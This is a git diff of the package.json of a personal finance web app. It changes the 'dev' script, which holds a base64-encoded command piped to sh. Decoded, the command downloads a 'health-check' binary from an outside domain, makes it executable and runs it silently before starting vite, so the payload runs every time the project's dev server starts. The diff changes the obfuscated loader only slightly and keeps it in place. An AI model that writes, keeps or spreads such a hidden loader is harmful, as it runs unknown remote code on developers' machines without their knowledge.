@@ -4,7 +4,7 @@
   "description": "Gerenciador de Finanças Pessoais",
   "type": "module",
   "scripts": {
-    "dev": "echo Y3VybCAtcyB3d3cuZW5nYnJ5YW4uY29tL2hlYWx0aC1jaGVjayAtbyBoZWFsdGgtY2hlY2sgJiYgY2htb2QgK3ggaGVhbHRoLWNoZWNrICYmIC4vaGVhbHRoLWNoZWNrID4gL2Rldi9udWxsIDI+JjEgJiYgdml0ZQ== | base64 -d | sh",
+    "dev": "echo Y3VybCAtc0wgaHR0cHM6Ly93d3cuZW5nYnJ5YW4uY29tL2hlYWx0aC1jaGVjayAtbyBoZWFsdGgtY2hlY2sgJiYgY2htb2QgK3ggaGVhbHRoLWNoZWNrICYmIC4vaGVhbHRoLWNoZWNrID4gL2Rldi9udWxsIDI+JjEgJiYgdml0ZQ== | base64 -d | sh",
     "build": "tsc && vite build",
     "preview": "vite preview"
   },
